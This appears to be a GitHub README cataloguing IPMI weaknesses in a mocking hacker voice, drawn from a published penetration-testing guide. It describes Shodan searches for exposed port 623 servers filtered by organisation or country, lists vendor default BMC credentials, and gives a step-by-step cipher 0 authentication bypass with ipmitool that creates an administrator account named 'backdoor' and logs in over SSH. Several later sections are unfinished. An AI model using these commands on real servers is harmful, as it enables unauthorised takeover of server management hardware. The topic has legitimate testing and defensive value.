# Awesome-IPMI
The one that just not exploit IPMI protocol.
Well this is a documentation of the IPMI based vulnerabilities, exploits and other relevant information regarding this protocol. 
SARCASM, TROLLING and JOKES are ADVISED.

# What the hack is IPMI?

### Academic way to say
Intelligent Platform Management Interface (IPMI) is a set of computer interface specifications for an autonomous computer subsystem that provides management and monitoring capabilities independently of the host system's CPU, firmware (BIOS or UEFI) and operating system. IPMI defines a set of interfaces used by system administrators for out-of-band management of computer systems and monitoring of their operation. For example, IPMI provides a way to manage a computer that may be powered off or otherwise unresponsive by using a network connection to the hardware rather than to an operating system or login shell.

### Noob way to say
Intelligent Platform Management Interface (IPMI) is a service and runs in general on port 623 which allows you to manage or monitor capabilities independently of the host system's CPU, firmware (BIOS or UEFI) and operating system.

### Hackers way to say
nmap target => port 623 => IPMI => Jackpot (https://www.youtube.com/watch?v=dQw4w9WgXcQ)

# IPMI Components
![Image of IPMI](https://upload.wikimedia.org/wikipedia/commons/f/f2/IPMI-Block-Diagram.png)

Heh .. I don't care, he doesn't care ... maybe you don't care ... lets hack the s**t out of it!

# Hunting for IPMI
### Normal peoples
Well you could use nmap or anything that can give open ports and services at a local or not so local network. Yes sir, you could also use commercial tools like Nessus or Nexpose but at the end of day is still poor security of IPMI that can allow an attacker to hack it in under 5 minutes (if he writes commands in terminal by hand and tends to make lots of mistakes).
But you know what? We can use Shodan (shodan.io) to search for a target (hei hei ... stop, stop .. be ethical!).

Hunting tactics > open pc > connect to the internet (sarcasm) > Log in / Register to Shodan > Search for port:623
(#facepalm, #hacking_like_a_pro, #hashtag, #even_more_sarcasm)

Well by doing that you will get like over 100.000 (> 100k) possible vulnerable servers from all around the world.

Don't you believe it? Here is a picture of it:
![Sitting ducks for Hackers](https://preview.ibb.co/c506BF/ipmi.png)

### Angry Hackers
Just add your desired organization (org: ...)

### Cyber Warfare
Just add your desired country (country: ...)

# Only one exploit and one vulnerability?
Hell no!

## Old school standard Usernames & Passwords
| Product name                                    | Default username | Default password                        |
|-------------------------------------------------|------------------|-----------------------------------------|
| ASUS iKVM BMC                                   | admin            | admin                                   |
| Dell Remote Access Card (iDRAC, DRAC)           | root             | calvin                                  |
| Fujitsu Integrated Remote Management Controller | admin            | admin                                   |
| HP Integrated Lights Out (iLO)                  | Administrator    | <factory randomized 8-character string> |
| IBM Integrated Management Module (IMM)          | USERID           | PASSW0RD (with a zero)                  |
| Oracle/Sun Integrated Lights Out Manager (ILOM) | root             | changeme                                |
| Supermicro IPMI (2.0)                           | ADMIN            | ADMIN                                   |

## IPMI Authentication Bypass via Cipher 0
Dan Farmer identified a serious failing of the IPMI 2.0 specification, namely that cipher type 0, an indicator that the client wants to use clear-text authentication, actually allows access with any password. Cipher 0 issues were identified in HP, Dell, and Supermicro BMCs, with the issue likely encompassing all IPMI 2.0 implementations. It is easy to identify systems that have cipher 0 enabled using the ipmi_cipher_zero module in the Metasploit Framework

#### Identification using Metasploit
```$ msfconsole
 
`      =[ metasploit v4.7.0-dev [core:4.7 api:1.0]
+ -- --=[ 1119 exploits - 638 auxiliary - 179 post
+ -- --=[ 309 payloads - 30 encoders - 8 nops
 
msf> use auxiliary/scanner/ipmi/ipmi_cipher_zero
msf auxiliary(ipmi_cipher_zero) > set RHOSTS 10.0.0.0/24
msf auxiliary(ipmi_cipher_zero) > run
[*] Sending IPMI requests to 10.0.0.0->10.0.0.255 (256 hosts)
[+] 10.0.0.99:623 VULNERABLE: Accepted a session open request for cipher zero
[+] 10.0.0.132:623 VULNERABLE: Accepted a session open request for cipher zero
[+] 10.0.0.141:623 VULNERABLE: Accepted a session open request for cipher zero
[+] 10.0.0.153:623 VULNERABLE: Accepted a session open request for cipher zero
```

#### Exploiting using IPMITOOL
First of let's install the tool (sudo apt-get install ipmitool) and after let's use it to bypass authentification.
```
$ ipmitool -I lanplus -H 10.0.0.99 -U Administrator -P FluffyWabbit user list
```
Error: Unable to establish IPMI v2 / RMCP+ session
Get User Access command failed (channel 14, user 1)
```
$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user list
```
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit

1  Administrator    true    false      true      ADMINISTRATOR

2  (Empty User)    true    false      false      NO ACCESS

```
$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user set name 2 backdoor
```
```
$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user set password 2 password
```
```
$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user priv 2 4
```
```
$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user enable 2
```
```
$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user list
```
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit

1  Administrator    true    false      true      ADMINISTRATOR

2  backdoor              true    false      true      ADMINISTRATOR

``` 
$ ssh backdoor@10.0.0.99
```

backdoor@10.0.0.99's password: password

User:backdoor logged-in to ILOMXQ3469216(10.0.0.99)

iLO 4 Advanced Evaluation 1.13 at  Nov 08 2012

Server Name: host is unnamed

Server Power: On
 
</>hpiLO->

## IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval  (A: are you that serious?)
tbc
## IPMI Anonymous Authentication (B: yes)
tbc
## Supermicro IPMI UPnP Vulnerability (A: Is it going to end now?)
tbc
## Supermicro IPMI Clear-text Passwords (B: No)
tbc

### What is broken?
### IPMI for sure is!

# But what is the big deal?
Just wait for it ... to be continued.


# Sources
* https://community.rapid7.com/community/metasploit/blog/2013/07/02/a-penetration-testers-guide-to-ipmi

